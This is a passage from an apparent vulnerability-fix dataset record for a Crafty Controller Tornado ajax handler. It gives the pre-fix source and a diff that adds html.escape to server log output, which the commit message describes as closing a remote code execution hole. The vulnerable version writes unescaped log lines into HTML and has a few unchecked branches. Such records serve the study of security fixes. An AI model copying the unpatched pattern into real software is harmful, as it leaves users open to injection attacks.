helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in save_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in save_file ajax call({})\".format(file_path)) return False with open(file_path, 'w') as file_object: file_object.write(file_contents) elif page==\"rename_item\": item_path=self.get_body_argument('item_path', default=None, strip=True) new_item_name=self.get_body_argument('new_item_name', default=None, strip=True) server_id=self.get_argument('id', None) print(server_id) if not self.check_server_id(server_id, 'rename_item'): return False else: server_id=bleach.clean(server_id) if item_path is None or new_item_name is None: logger.warning(\"Invalid path(s) in rename_item ajax call\") console.warning(\"Invalid path(s) in rename_item ajax call\") return False if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], item_path) \\ or not helper.check_path_exists(os.path.abspath(item_path)): logger.warning(\"Invalid old name path in rename_item ajax call({})\".format(server_id)) console.warning(\"Invalid old name path in rename_item ajax call({})\".format(server_id)) return False new_item_path=os.path.join(os.path.split(item_path)[0], new_item_name) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], new_item_path) \\ or helper.check_path_exists(os.path.abspath(new_item_path)): logger.warning(\"Invalid new name path in rename_item ajax call({})\".format(server_id)) console.warning(\"Invalid new name path in rename_item ajax call({})\".format(server_id)) return False os.rename(item_path, new_item_path) def check_server_id(self, server_id, page_name): if server_id is None: logger.warning(\"Server ID not defined in{} ajax call({})\".format(page_name, server_id)) console.warning(\"Server ID not defined in{} ajax call({})\".format(page_name, server_id)) return False else: server_id=bleach.clean(server_id) if not db_helper.server_id_exists(server_id): logger.warning(\"Server ID not found in{} ajax call({})\".format(page_name, server_id)) console.warning(\"Server ID not found in{} ajax call({})\".format(page_name, server_id)) return False return True ","sourceWithComments":"import json\nimport logging\nimport tornado.web\nimport tornado.escape\nimport bleach\nimport os\nimport shutil\n\nfrom app.classes.shared.console import console\nfrom app.classes.shared.models import Users, installer\nfrom app.classes.web.base_handler import BaseHandler\nfrom app.classes.shared.models import db_helper\nfrom app.classes.shared.helpers import helper\n\nlogger = logging.getLogger(__name__)\n\n\nclass AjaxHandler(BaseHandler):\n\n    def render_page(self, template, page_data):\n        self.render(\n            template,\n            data=page_data,\n            translate=self.translator.translate,\n        )\n\n    @tornado.web.authenticated\n    def get(self, page):\n        user_data = json.loads(self.get_secure_cookie(\"user_data\"))\n        error = bleach.clean(self.get_argument('error', \"WTF Error!\"))\n\n        template = \"panel\/denied.html\"\n\n        page_data = {\n            'user_data': user_data,\n            'error': error\n        }\n\n        if page == \"error\":\n            template = \"public\/error.html\"\n            self.render_page(template, page_data)\n\n        elif page == 'server_log':\n            server_id = self.get_argument('id', None)\n            full_log = self.get_argument('full', False)\n\n            if server_id is None:\n                logger.warning(\"Server ID not found in server_log ajax call\")\n                self.redirect(\"\/panel\/error?error=Server ID Not Found\")\n                return False\n\n            server_id = bleach.clean(server_id)\n\n            server_data = db_helper.get_server_data_by_id(server_id)\n            if not server_data:\n                logger.warning(\"Server Data not found in server_log ajax call\")\n                self.redirect(\"\/panel\/error?error=Server ID Not Found\")\n\n            if not server_data['log_path']:\n                logger.warning(\"Log path not found in server_log ajax call ({})\".format(server_id))\n\n            if full_log:\n                log_lines = helper.get_setting('max_log_lines')\n            else:\n                log_lines = helper.get_setting('virtual_terminal_lines')\n\n            data = helper.tail_file(server_data['log_path'], log_lines)\n\n            for d in data:\n                try:\n                    line = helper.log_colors(d)\n                    self.write('{}<br \/>'.format(line))\n                    # self.write(d.encode(\"utf-8\"))\n\n                except Exception as e:\n                    logger.warning(\"Skipping Log Line due to error: {}\".format(e))\n                    pass\n\n        elif page == \"announcements\":\n            data = helper.get_announcements()\n            page_data['notify_data'] = data\n            self.render_page('ajax\/notify.html', page_data)\n\n        elif page == \"get_file\":\n            file_path = self.get_argument('file_path', None)\n            server_id = self.get_argument('id', None)\n\n            if not self.check_server_id(server_id, 'get_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\\n                or not helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in get_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in get_file ajax call ({})\".format(file_path))\n                return False\n            \n            \n            error = None\n            \n            try:\n                with open(file_path) as file:\n                    file_contents = file.read()\n            except UnicodeDecodeError:\n                file_contents = ''\n                error = 'UnicodeDecodeError'\n\n            self.write({\n                'content': file_contents,\n                'error': error\n            })\n            self.finish()\n\n        elif page == \"get_tree\":\n            server_id = self.get_argument('id', None)\n\n            if not self.check_server_id(server_id, 'get_tree'): return False\n            else: server_id = bleach.clean(server_id)\n\n            self.write(db_helper.get_server_data_by_id(server_id)['path'] + '\\n' +\n                       helper.generate_tree(db_helper.get_server_data_by_id(server_id)['path']))\n            self.finish()\n\n    @tornado.web.authenticated\n    def post(self, page):\n        user_data = json.loads(self.get_secure_cookie(\"user_data\"))\n        error = bleach.clean(self.get_argument('error', \"WTF Error!\"))\n\n        page_data = {\n            'user_data': user_data,\n            'error': error\n        }\n\n        if page == \"send_command\":\n            command = self.get_body_argument('command', default=None, strip=True)\n            server_id = self.get_argument('id')\n\n            if server_id is None:\n                logger.warning(\"Server ID not found in send_command ajax call\")\n                console.warning(\"Server ID not found in send_command ajax call\")\n\n            srv_obj = self.controller.get_server_obj(server_id)\n\n            if command:\n                if srv_obj.check_running():\n                    srv_obj.send_command(command)\n\n        elif page == \"create_file\":\n            file_parent = self.get_body_argument('file_parent', default=None, strip=True)\n            file_name = self.get_body_argument('file_name', default=None, strip=True)\n            file_path = os.path.join(file_parent, file_name)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'create_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path) \\\n                or helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in create_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in create_file ajax call ({})\".format(file_path))\n                return False\n\n            # Create the file by opening it\n            with open(file_path, 'w') as file_object:\n                file_object.close()\n\n        elif page == \"create_dir\":\n            dir_parent = self.get_body_argument('dir_parent', default=None, strip=True)\n            dir_name = self.get_body_argument('dir_name', default=None, strip=True)\n            dir_path = os.path.join(dir_parent, dir_name)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'create_dir'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], dir_path) \\\n                or helper.check_path_exists(os.path.abspath(dir_path)):\n                logger.warning(\"Invalid path in create_dir ajax call ({})\".format(dir_path))\n                console.warning(\"Invalid path in create_dir ajax call ({})\".format(dir_path))\n                return False\n\n            # Create the directory\n            os.mkdir(dir_path)\n\n    @tornado.web.authenticated\n    def delete(self, page):\n        if page == \"del_file\":\n            file_path = self.get_body_argument('file_path', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n\n            console.warning(\"delete {} for server {}\".format(file_path, server_id))\n\n            if not self.check_server_id(server_id, 'del_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            server_info = db_helper.get_server_data_by_id(server_id)\n            if not (helper.in_path(server_info['path'], file_path) \\\n                or helper.in_path(server_info['backup_path'], file_path)) \\\n                or not helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in del_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in del_file ajax call ({})\".format(file_path))\n                return False\n\n            # Delete the file\n            os.remove(file_path)\n\n        elif page == \"del_dir\":\n            dir_path = self.get_body_argument('dir_path', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            console.warning(\"delete {} for server {}\".format(file_path, server_id))\n\n            if not self.check_server_id(server_id, 'del_dir'): return False\n            else: server_id = bleach.clean(server_id)\n\n            server_info = db_helper.get_server_data_by_id(server_id)\n            if not helper.in_path(server_info['path'], dir_path) \\\n                or not helper.check_path_exists(os.path.abspath(dir_path)):\n                logger.warning(\"Invalid path in del_file ajax call ({})\".format(dir_path))\n                console.warning(\"Invalid path in del_file ajax call ({})\".format(dir_path))\n                return False\n\n            # Delete the directory\n            # os.rmdir(dir_path)     # Would only remove empty directories\n            shutil.rmtree(dir_path)  # Removes also when there are contents\n\n    @tornado.web.authenticated\n    def put(self, page):\n        if page == \"save_file\":\n            file_contents = self.get_body_argument('file_contents', default=None, strip=True)\n            file_path = self.get_body_argument('file_path', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n            print(file_contents)\n            print(file_path)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'save_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\\n                or not helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in save_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in save_file ajax call ({})\".format(file_path))\n                return False\n\n            # Open the file in write mode and store the content in file_object\n            with open(file_path, 'w') as file_object:\n                file_object.write(file_contents)\n\n        elif page == \"rename_item\":\n            item_path = self.get_body_argument('item_path', default=None, strip=True)\n            new_item_name = self.get_body_argument('new_item_name', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'rename_item'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if item_path is None or new_item_name is None:\n                logger.warning(\"Invalid path(s) in rename_item ajax call\")\n                console.warning(\"Invalid path(s) in rename_item ajax call\")\n                return False\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], item_path) \\\n                or not helper.check_path_exists(os.path.abspath(item_path)):\n                logger.warning(\"Invalid old name path in rename_item ajax call ({})\".format(server_id))\n                console.warning(\"Invalid old name path in rename_item ajax call ({})\".format(server_id))\n                return False\n\n            new_item_path = os.path.join(os.path.split(item_path)[0], new_item_name)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], new_item_path) \\\n                or helper.check_path_exists(os.path.abspath(new_item_path)):\n                logger.warning(\"Invalid new name path in rename_item ajax call ({})\".format(server_id))\n                console.warning(\"Invalid new name path in rename_item ajax call ({})\".format(server_id))\n                return False\n\n            # RENAME\n            os.rename(item_path, new_item_path)\n    def check_server_id(self, server_id, page_name):\n        if server_id is None:\n            logger.warning(\"Server ID not defined in {} ajax call ({})\".format(page_name, server_id))\n            console.warning(\"Server ID not defined in {} ajax call ({})\".format(page_name, server_id))\n            return False\n        else:\n            server_id = bleach.clean(server_id)\n\n            # does this server id exist?\n            if not db_helper.server_id_exists(server_id):\n                logger.warning(\"Server ID not found in {} ajax call ({})\".format(page_name, server_id))\n                console.warning(\"Server ID not found in {} ajax call ({})\".format(page_name, server_id))\n                return False\n        return True\n"}},"msg":"Escape logfile output, fixes weird formatting and remote code execution vulnerability"}},"https:\/\/github.com\/MyNameTsThad\/crafty-4-stdin":{"a79f42f4da049db99251db76ce4897446fc1542e":{"url":"https:\/\/api.github.com\/repos\/MyNameTsThad\/crafty-4-stdin\/commits\/a79f42f4da049db99251db76ce4897446fc1542e","html_url":"https:\/\/github.com\/MyNameTsThad\/crafty-4-stdin\/commit\/a79f42f4da049db99251db76ce4897446fc1542e","message":"Escape logfile output, fixes weird formatting and remote code execution vulnerability","sha":"a79f42f4da049db99251db76ce4897446fc1542e","keyword":"remote code execution vulnerable","diff":"diff --git a\/app\/classes\/web\/ajax_handler.py b\/app\/classes\/web\/ajax_handler.py\nindex 0796527e..0f0cdb4c 100644\n--- a\/app\/classes\/web\/ajax_handler.py\n+++ b\/app\/classes\/web\/ajax_handler.py\n@@ -5,6 +5,7 @@\n import bleach\n import os\n import shutil\n+import html\n \n from app.classes.shared.console import console\n from app.classes.shared.models import Users, installer\n@@ -68,7 +69,7 @@ def get(self, page):\n \n             for d in data:\n                 try:\n-                    line = helper.log_colors(d)\n+                    line = helper.log_colors(html.escape(d))\n                     self.write('{}<br \/>'.format(line))\n                     # self.write(d.encode(\"utf-8\"))\n \n","files":{"\/app\/classes\/web\/ajax_handler.py":{"changes":[{"diff":"\n \n             for d in data:\n                 try:\n-                    line = helper.log_colors(d)\n+                    line = helper.log_colors(html.escape(d))\n                     self.write('{}<br \/>'.format(line))\n                     # self.write(d.encode(\"utf-8\"))\n \n","add":1,"remove":1,"filename":"\/app\/classes\/web\/ajax_handler.py","badparts":["                    line = helper.log_colors(d)"],"goodparts":["                    line = helper.log_colors(html.escape(d))"]},{"diff":"\n \n             for d in data:\n                 try:\n-                    line = helper.log_colors(d)\n+                    line = helper.log_colors(html.escape(d))\n                     self.write('{}<br \/>'.format(line))\n                     # self.write(d.encode(\"utf-8\"))\n \n","add":1,"remove":1,"filename":"\/app\/classes\/web\/ajax_handler.py","badparts":["                    line = helper.log_colors(d)"],"goodparts":["                    line = helper.log_colors(html.escape(d))"]}],"source":"\nimport json import logging import tornado.web import tornado.escape import bleach import os import shutil from app.classes.shared.console import console from app.classes.shared.models import Users, installer from app.classes.web.base_handler import BaseHandler from app.classes.shared.models import db_helper from app.classes.shared.helpers import helper logger=logging.getLogger(__name__) class AjaxHandler(BaseHandler): def render_page(self, template, page_data): self.render( template, data=page_data, translate=self.translator.translate, ) @tornado.web.authenticated def get(self, page): user_data=json.loads(self.get_secure_cookie(\"user_data\")) error=bleach.clean(self.get_argument('error', \"WTF Error!\")) template=\"panel\/denied.html\" page_data={ 'user_data': user_data, 'error': error } if page==\"error\": template=\"public\/error.html\" self.render_page(template, page_data) elif page=='server_log': server_id=self.get_argument('id', None) full_log=self.get_argument('full', False) if server_id is None: logger.warning(\"Server ID not found in server_log ajax call\") self.redirect(\"\/panel\/error?error=Server ID Not Found\") return False server_id=bleach.clean(server_id) server_data=db_helper.get_server_data_by_id(server_id) if not server_data: logger.warning(\"Server Data not found in server_log ajax call\") self.redirect(\"\/panel\/error?error=Server ID Not Found\") if not server_data['log_path']: logger.warning(\"Log path not found in server_log ajax call({})\".format(server_id)) if full_log: log_lines=helper.get_setting('max_log_lines') else: log_lines=helper.get_setting('virtual_terminal_lines') data=helper.tail_file(server_data['log_path'], log_lines) for d in data: try: line=helper.log_colors(d) self.write('{}<br \/>'.format(line)) except Exception as e: logger.warning(\"Skipping Log Line due to error:{}\".format(e)) pass elif page==\"announcements\": data=helper.get_announcements() page_data['notify_data']=data self.render_page('ajax\/notify.html', page_data) elif page==\"get_file\": file_path=self.get_argument('file_path', None) server_id=self.get_argument('id', None) if not self.check_server_id(server_id, 'get_file'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\ or not helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in get_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in get_file ajax call({})\".format(file_path)) return False error=None try: with open(file_path) as file: file_contents=file.read() except UnicodeDecodeError: file_contents='' error='UnicodeDecodeError' self.write({ 'content': file_contents, 'error': error }) self.finish() elif page==\"get_tree\": server_id=self.get_argument('id', None) if not self.check_server_id(server_id, 'get_tree'): return False else: server_id=bleach.clean(server_id) self.write(db_helper.get_server_data_by_id(server_id)['path'] +'\\n' + helper.generate_tree(db_helper.get_server_data_by_id(server_id)['path'])) self.finish() @tornado.web.authenticated def post(self, page): user_data=json.loads(self.get_secure_cookie(\"user_data\")) error=bleach.clean(self.get_argument('error', \"WTF Error!\")) page_data={ 'user_data': user_data, 'error': error } if page==\"send_command\": command=self.get_body_argument('command', default=None, strip=True) server_id=self.get_argument('id') if server_id is None: logger.warning(\"Server ID not found in send_command ajax call\") console.warning(\"Server ID not found in send_command ajax call\") srv_obj=self.controller.get_server_obj(server_id) if command: if srv_obj.check_running(): srv_obj.send_command(command) elif page==\"create_file\": file_parent=self.get_body_argument('file_parent', default=None, strip=True) file_name=self.get_body_argument('file_name', default=None, strip=True) file_path=os.path.join(file_parent, file_name) server_id=self.get_argument('id', None) print(server_id) if not self.check_server_id(server_id, 'create_file'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path) \\ or helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in create_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in create_file ajax call({})\".format(file_path)) return False with open(file_path, 'w') as file_object: file_object.close() elif page==\"create_dir\": dir_parent=self.get_body_argument('dir_parent', default=None, strip=True) dir_name=self.get_body_argument('dir_name', default=None, strip=True) dir_path=os.path.join(dir_parent, dir_name) server_id=self.get_argument('id', None) print(server_id) if not self.check_server_id(server_id, 'create_dir'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], dir_path) \\ or helper.check_path_exists(os.path.abspath(dir_path)): logger.warning(\"Invalid path in create_dir ajax call({})\".format(dir_path)) console.warning(\"Invalid path in create_dir ajax call({})\".format(dir_path)) return False os.mkdir(dir_path) @tornado.web.authenticated def delete(self, page): if page==\"del_file\": file_path=self.get_body_argument('file_path', default=None, strip=True) server_id=self.get_argument('id', None) console.warning(\"delete{} for server{}\".format(file_path, server_id)) if not self.check_server_id(server_id, 'del_file'): return False else: server_id=bleach.clean(server_id) server_info=db_helper.get_server_data_by_id(server_id) if not(helper.in_path(server_info['path'], file_path) \\ or helper.in_path(server_info['backup_path'], file_path)) \\ or not helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in del_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in del_file ajax call({})\".format(file_path)) return False os.remove(file_path) elif page==\"del_dir\": dir_path=self.get_body_argument('dir_path', default=None, strip=True) server_id=self.get_argument('id', None) print(server_id) console.warning(\"delete{} for server{}\".format(file_path, server_id)) if not self.check_server_id(server_id, 'del_dir'): return False else: server_id=bleach.clean(server_id) server_info=db_helper.get_server_data_by_id(server_id) if not helper.in_path(server_info['path'], dir_path) \\ or not helper.check_path_exists(os.path.abspath(dir_path)): logger.warning(\"Invalid path in del_file ajax call({})\".format(dir_path)) console.warning(\"Invalid path in del_file ajax call({})\".format(dir_path)) return False shutil.rmtree(dir_path) @tornado.web.authenticated def put(self, page): if page==\"save_file\": file_contents=self.get_body_argument('file_contents', default=None, strip=True) file_path=self.get_body_argument('file_path', default=None, strip=True) server_id=self.get_argument('id', None) print(file_contents) print(file_path) print(server_id) if not self.check_server_id(server_id, 'save_file'): return False else: server_id=bleach.clean(server_id) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\ or not helper.check_file_exists(os.path.abspath(file_path)): logger.warning(\"Invalid path in save_file ajax call({})\".format(file_path)) console.warning(\"Invalid path in save_file ajax call({})\".format(file_path)) return False with open(file_path, 'w') as file_object: file_object.write(file_contents) elif page==\"rename_item\": item_path=self.get_body_argument('item_path', default=None, strip=True) new_item_name=self.get_body_argument('new_item_name', default=None, strip=True) server_id=self.get_argument('id', None) print(server_id) if not self.check_server_id(server_id, 'rename_item'): return False else: server_id=bleach.clean(server_id) if item_path is None or new_item_name is None: logger.warning(\"Invalid path(s) in rename_item ajax call\") console.warning(\"Invalid path(s) in rename_item ajax call\") return False if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], item_path) \\ or not helper.check_path_exists(os.path.abspath(item_path)): logger.warning(\"Invalid old name path in rename_item ajax call({})\".format(server_id)) console.warning(\"Invalid old name path in rename_item ajax call({})\".format(server_id)) return False new_item_path=os.path.join(os.path.split(item_path)[0], new_item_name) if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], new_item_path) \\ or helper.check_path_exists(os.path.abspath(new_item_path)): logger.warning(\"Invalid new name path in rename_item ajax call({})\".format(server_id)) console.warning(\"Invalid new name path in rename_item ajax call({})\".format(server_id)) return False os.rename(item_path, new_item_path) def check_server_id(self, server_id, page_name): if server_id is None: logger.warning(\"Server ID not defined in{} ajax call({})\".format(page_name, server_id)) console.warning(\"Server ID not defined in{} ajax call({})\".format(page_name, server_id)) return False else: server_id=bleach.clean(server_id) if not db_helper.server_id_exists(server_id): logger.warning(\"Server ID not found in{} ajax call({})\".format(page_name, server_id)) console.warning(\"Server ID not found in{} ajax call({})\".format(page_name, server_id)) return False return True ","sourceWithComments":"import json\nimport logging\nimport tornado.web\nimport tornado.escape\nimport bleach\nimport os\nimport shutil\n\nfrom app.classes.shared.console import console\nfrom app.classes.shared.models import Users, installer\nfrom app.classes.web.base_handler import BaseHandler\nfrom app.classes.shared.models import db_helper\nfrom app.classes.shared.helpers import helper\n\nlogger = logging.getLogger(__name__)\n\n\nclass AjaxHandler(BaseHandler):\n\n    def render_page(self, template, page_data):\n        self.render(\n            template,\n            data=page_data,\n            translate=self.translator.translate,\n        )\n\n    @tornado.web.authenticated\n    def get(self, page):\n        user_data = json.loads(self.get_secure_cookie(\"user_data\"))\n        error = bleach.clean(self.get_argument('error', \"WTF Error!\"))\n\n        template = \"panel\/denied.html\"\n\n        page_data = {\n            'user_data': user_data,\n            'error': error\n        }\n\n        if page == \"error\":\n            template = \"public\/error.html\"\n            self.render_page(template, page_data)\n\n        elif page == 'server_log':\n            server_id = self.get_argument('id', None)\n            full_log = self.get_argument('full', False)\n\n            if server_id is None:\n                logger.warning(\"Server ID not found in server_log ajax call\")\n                self.redirect(\"\/panel\/error?error=Server ID Not Found\")\n                return False\n\n            server_id = bleach.clean(server_id)\n\n            server_data = db_helper.get_server_data_by_id(server_id)\n            if not server_data:\n                logger.warning(\"Server Data not found in server_log ajax call\")\n                self.redirect(\"\/panel\/error?error=Server ID Not Found\")\n\n            if not server_data['log_path']:\n                logger.warning(\"Log path not found in server_log ajax call ({})\".format(server_id))\n\n            if full_log:\n                log_lines = helper.get_setting('max_log_lines')\n            else:\n                log_lines = helper.get_setting('virtual_terminal_lines')\n\n            data = helper.tail_file(server_data['log_path'], log_lines)\n\n            for d in data:\n                try:\n                    line = helper.log_colors(d)\n                    self.write('{}<br \/>'.format(line))\n                    # self.write(d.encode(\"utf-8\"))\n\n                except Exception as e:\n                    logger.warning(\"Skipping Log Line due to error: {}\".format(e))\n                    pass\n\n        elif page == \"announcements\":\n            data = helper.get_announcements()\n            page_data['notify_data'] = data\n            self.render_page('ajax\/notify.html', page_data)\n\n        elif page == \"get_file\":\n            file_path = self.get_argument('file_path', None)\n            server_id = self.get_argument('id', None)\n\n            if not self.check_server_id(server_id, 'get_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\\n                or not helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in get_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in get_file ajax call ({})\".format(file_path))\n                return False\n            \n            \n            error = None\n            \n            try:\n                with open(file_path) as file:\n                    file_contents = file.read()\n            except UnicodeDecodeError:\n                file_contents = ''\n                error = 'UnicodeDecodeError'\n\n            self.write({\n                'content': file_contents,\n                'error': error\n            })\n            self.finish()\n\n        elif page == \"get_tree\":\n            server_id = self.get_argument('id', None)\n\n            if not self.check_server_id(server_id, 'get_tree'): return False\n            else: server_id = bleach.clean(server_id)\n\n            self.write(db_helper.get_server_data_by_id(server_id)['path'] + '\\n' +\n                       helper.generate_tree(db_helper.get_server_data_by_id(server_id)['path']))\n            self.finish()\n\n    @tornado.web.authenticated\n    def post(self, page):\n        user_data = json.loads(self.get_secure_cookie(\"user_data\"))\n        error = bleach.clean(self.get_argument('error', \"WTF Error!\"))\n\n        page_data = {\n            'user_data': user_data,\n            'error': error\n        }\n\n        if page == \"send_command\":\n            command = self.get_body_argument('command', default=None, strip=True)\n            server_id = self.get_argument('id')\n\n            if server_id is None:\n                logger.warning(\"Server ID not found in send_command ajax call\")\n                console.warning(\"Server ID not found in send_command ajax call\")\n\n            srv_obj = self.controller.get_server_obj(server_id)\n\n            if command:\n                if srv_obj.check_running():\n                    srv_obj.send_command(command)\n\n        elif page == \"create_file\":\n            file_parent = self.get_body_argument('file_parent', default=None, strip=True)\n            file_name = self.get_body_argument('file_name', default=None, strip=True)\n            file_path = os.path.join(file_parent, file_name)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'create_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path) \\\n                or helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in create_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in create_file ajax call ({})\".format(file_path))\n                return False\n\n            # Create the file by opening it\n            with open(file_path, 'w') as file_object:\n                file_object.close()\n\n        elif page == \"create_dir\":\n            dir_parent = self.get_body_argument('dir_parent', default=None, strip=True)\n            dir_name = self.get_body_argument('dir_name', default=None, strip=True)\n            dir_path = os.path.join(dir_parent, dir_name)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'create_dir'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], dir_path) \\\n                or helper.check_path_exists(os.path.abspath(dir_path)):\n                logger.warning(\"Invalid path in create_dir ajax call ({})\".format(dir_path))\n                console.warning(\"Invalid path in create_dir ajax call ({})\".format(dir_path))\n                return False\n\n            # Create the directory\n            os.mkdir(dir_path)\n\n    @tornado.web.authenticated\n    def delete(self, page):\n        if page == \"del_file\":\n            file_path = self.get_body_argument('file_path', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n\n            console.warning(\"delete {} for server {}\".format(file_path, server_id))\n\n            if not self.check_server_id(server_id, 'del_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            server_info = db_helper.get_server_data_by_id(server_id)\n            if not (helper.in_path(server_info['path'], file_path) \\\n                or helper.in_path(server_info['backup_path'], file_path)) \\\n                or not helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in del_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in del_file ajax call ({})\".format(file_path))\n                return False\n\n            # Delete the file\n            os.remove(file_path)\n\n        elif page == \"del_dir\":\n            dir_path = self.get_body_argument('dir_path', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            console.warning(\"delete {} for server {}\".format(file_path, server_id))\n\n            if not self.check_server_id(server_id, 'del_dir'): return False\n            else: server_id = bleach.clean(server_id)\n\n            server_info = db_helper.get_server_data_by_id(server_id)\n            if not helper.in_path(server_info['path'], dir_path) \\\n                or not helper.check_path_exists(os.path.abspath(dir_path)):\n                logger.warning(\"Invalid path in del_file ajax call ({})\".format(dir_path))\n                console.warning(\"Invalid path in del_file ajax call ({})\".format(dir_path))\n                return False\n\n            # Delete the directory\n            # os.rmdir(dir_path)     # Would only remove empty directories\n            shutil.rmtree(dir_path)  # Removes also when there are contents\n\n    @tornado.web.authenticated\n    def put(self, page):\n        if page == \"save_file\":\n            file_contents = self.get_body_argument('file_contents', default=None, strip=True)\n            file_path = self.get_body_argument('file_path', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n            print(file_contents)\n            print(file_path)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'save_file'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], file_path)\\\n                or not helper.check_file_exists(os.path.abspath(file_path)):\n                logger.warning(\"Invalid path in save_file ajax call ({})\".format(file_path))\n                console.warning(\"Invalid path in save_file ajax call ({})\".format(file_path))\n                return False\n\n            # Open the file in write mode and store the content in file_object\n            with open(file_path, 'w') as file_object:\n                file_object.write(file_contents)\n\n        elif page == \"rename_item\":\n            item_path = self.get_body_argument('item_path', default=None, strip=True)\n            new_item_name = self.get_body_argument('new_item_name', default=None, strip=True)\n            server_id = self.get_argument('id', None)\n            print(server_id)\n\n            if not self.check_server_id(server_id, 'rename_item'): return False\n            else: server_id = bleach.clean(server_id)\n\n            if item_path is None or new_item_name is None:\n                logger.warning(\"Invalid path(s) in rename_item ajax call\")\n                console.warning(\"Invalid path(s) in rename_item ajax call\")\n                return False\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], item_path) \\\n                or not helper.check_path_exists(os.path.abspath(item_path)):\n                logger.warning(\"Invalid old name path in rename_item ajax call ({})\".format(server_id))\n                console.warning(\"Invalid old name path in rename_item ajax call ({})\".format(server_id))\n                return False\n\n            new_item_path = os.path.join(os.path.split(item_path)[0], new_item_name)\n\n            if not helper.in_path(db_helper.get_server_data_by_id(server_id)['path'], new_item_path) \\\n                or helper.check_path_exists(os.path.abspath(new_item_path)):\n                logger.warning(\"Invalid new name path in rename_item ajax call ({})\".format(server_id))\n                console.warning(\"Invalid new name path in rename_item ajax call ({})\".format(server_id))\n                return False\n\n            # RENAME\n            os.rename(item_path, new_item_path)\n    def check_server_id(self, server_id, page_name):\n        if server_id is None:\n            logger.warning(\"Server ID not defined in {} ajax call ({})\".format(page_name, server_id))\n            console.warning(\"Server ID not defined in {} ajax call ({})\".format(page_name, server_id))\n            return False\n        else:\n            server_id = bleach.clean(server_id)\n\n            # does this server id exist?\n            if not db_helper.server_id_exists(server_id):\n                logger.warning(\"Server ID not found in {} ajax call ({})\".format(page_name, server_id))\n                console.warning(\"Server ID not found in {} ajax call ({})\".format(page_name, server_id))\n                return False\n        return True\n"}},"msg":"Escape logfile output, fixes weird formatting and remote code execution vulnerability"}}}